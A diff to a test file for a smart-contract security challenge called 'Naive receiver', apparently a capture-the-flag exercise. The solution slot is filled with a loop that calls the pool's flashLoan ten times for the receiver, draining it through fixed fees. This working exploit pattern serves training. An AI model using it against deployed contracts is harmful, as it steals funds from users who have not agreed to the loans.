@@ -1,7 +1,7 @@
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
 
-describe('[Challenge] Naive receiver', function () {
+describe.only('[Challenge] Naive receiver', function () {
     let deployer, user, player;
     let pool, receiver;
 
@@ -17,11 +17,11 @@ describe('[Challenge] Naive receiver', function () {
 
         const LenderPoolFactory = await ethers.getContractFactory('NaiveReceiverLenderPool', deployer);
         const FlashLoanReceiverFactory = await ethers.getContractFactory('FlashLoanReceiver', deployer);
-        
+
         pool = await LenderPoolFactory.deploy();
         await deployer.sendTransaction({ to: pool.address, value: ETHER_IN_POOL });
         const ETH = await pool.ETH();
-        
+
         expect(await ethers.provider.getBalance(pool.address)).to.be.equal(ETHER_IN_POOL);
         expect(await pool.maxFlashLoan(ETH)).to.eq(ETHER_IN_POOL);
         expect(await pool.flashFee(ETH, 0)).to.eq(10n ** 18n);
@@ -38,6 +38,9 @@ describe('[Challenge] Naive receiver', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        for(let i = 0; i < 10; i++) {
+            await pool.flashLoan(receiver.address, await pool.ETH(), 0, "0x");
+        }
     });
 
     after(async function () {
